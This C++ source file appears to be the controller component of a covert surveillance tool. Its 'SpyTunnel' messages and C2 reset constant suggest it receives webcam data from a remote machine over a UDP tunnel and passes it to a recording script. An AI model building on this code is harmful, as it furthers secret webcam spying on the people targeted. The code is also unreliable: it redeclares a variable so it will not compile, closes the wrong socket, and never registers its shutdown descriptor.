#include "webcam_recorder.hpp"

void WebcamRecorder::run() {
    pid_ = fork();
    if (pid_ < 0) {
        write_fifo_error("[WebcamRecorder::run] Unable to fork a child process");
    } else if (pid_ == 0) {
        if (tunnel_socket_ != -1) {
            close(tunnel_socket_);
        }
        if (tunnel_end_socket_ != -1) {
            close(tunnel_socket_);
        }
        
        spawn_window();
        _exit(EXIT_FAILURE);
    } 

    int tries = 0;
    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
        return;
    }

    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (tunnel_shutdown_fd_.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
        return;
    }

    int rc = udp_handshake(&dev_num_, sizeof(dev_num_));
    if (rc < 0) {
        return;
    }

    ScopedEpollFD epoll_fd;
    int rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        return;
    }

    struct epoll_event frame_event;
    frame_event.data.fd = tunnel_socket_;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &frame_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    } 

    char test_buffer[BUFFER_SIZE];
    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return;
            } if (events[i].data.fd == tunnel_socket_) {
                int bytes_read = recvfrom(tunnel_socket_, test_buffer, BUFFER_SIZE, 0, (struct sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
                if (bytes_read < 0) {
                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                    return;
                } else if (bytes_read == 0) {
                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                    return;
                } else {
                    if (memcmp(test_buffer, OUT_KEY, OUT_KEY_LEN) == 0) {
                        write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                        return;
                    }
                    write(tunnel_fifo_, test_buffer, bytes_read);
                }
            }
        }


    }

}

void WebcamRecorder::spawn_window() {
    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_wr", "-e", WEBCAM_RECORDER_SCRIPT_PATH, fifo_path_.c_str(), out_name_, (char*)NULL);
}